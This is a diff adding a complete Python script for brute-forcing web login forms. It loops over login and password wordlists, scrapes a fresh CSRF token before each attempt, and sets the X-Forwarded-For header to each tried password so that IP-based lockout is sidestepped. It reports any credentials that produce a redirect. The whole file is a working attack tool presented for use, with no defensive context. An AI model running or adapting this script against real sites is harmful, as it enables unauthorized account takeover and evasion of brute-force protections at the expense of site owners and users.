@@ -1,0 +1,99 @@
+#!/usr/bin/env python3
+import re
+import requests
+import argparse
+import sys
+import json
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+def open_file(path):
+    return [item.replace("\n", "") for item in open(path).readlines()]
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', '--url', help='post action url', type=str)
+parser.add_argument('-p', '--password', help='Single password to test', type=str)
+parser.add_argument('-P', '--passwords', help='Passwords wordlist file', type=argparse.FileType('r'))
+parser.add_argument('-l', '--login', help='Single login to test', type=str)
+parser.add_argument('-L', '--logins', help='Logins wordlist file', type=str)
+parser.add_argument('-c', '--csrf', help='CSRF token POST parameter name', type=str)
+parser.add_argument('-a', '--additional', help='JSON string for additional POST data', type=str)
+
+args = parser.parse_args()
+
+if args.url is None:
+    print("ERROR: URL not specified")
+    sys.exit()
+
+if args.csrf is None:
+    print("ERROR: CSRF token POST parameter not specified")
+    sys.exit()
+
+if args.passwords is not None and args.password is not None:
+    print("ERROR: Cannot use both single password and password wordlist")
+    sys.exit()
+elif args.passwords is None and args.password is  None:
+    print("ERROR: Single password or password wordlist not specified")
+    sys.exit()
+elif args.passwords is not None:
+    password_list = open_file(args.passwords.name)
+else:
+    password_list = [ args.password ]
+
+if args.logins is not None and args.login is not None:
+    print("ERROR: Cannot use both single login and login wordlist")
+    sys.exit()
+elif args.logins is None and args.login is  None:
+    print("ERROR: Single login or login wordlist not specified")
+    sys.exit()
+elif args.logins is not None:
+    login_list = open_file(args.logins.name)
+else:
+    login_list = [ args.login ]
+
+if args.additional is not None:
+    post_additional_data = json.loads(args.additional)
+else:
+    post_additional_data = {}
+
+print("[+] Attacking {u}".format(u = args.url))
+
+try:
+    for username in login_list:
+        for password in password_list:
+            session = requests.Session()
+            page = session.get(args.url)
+            csrf_token = re.search('input.+?name="'+args.csrf+'".+?value="(.+?)"', page.text).group(1)
+        
+            print('[-] Testing User = {u} and Password = {p}'.format(u = username, p = password))
+        
+            headers = {
+                'X-Forwarded-For': password,
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+                'Referer': args.url
+            }
+        
+            post_login_data = {
+                'tokenCSRF': csrf_token,
+                'username': username,
+                'password': password
+            }
+        
+            post_data = {**post_login_data, **post_additional_data}
+        
+            result = session.post(args.url, headers = headers, data = post_data, allow_redirects = False)
+        
+            if 'location' in result.headers and result.headers['location'] != args.url:
+                print(bcolors.OKGREEN + '[!] Password found! Use {u}:{p} to login.'.format(u = username, p = password))
+                print('[!] Login redirects to {r}'.format(r = result.headers['location']) + bcolors.ENDC)
+except KeyboardInterrupt:
+    print("[!] Interrupted")
+    sys.exit()
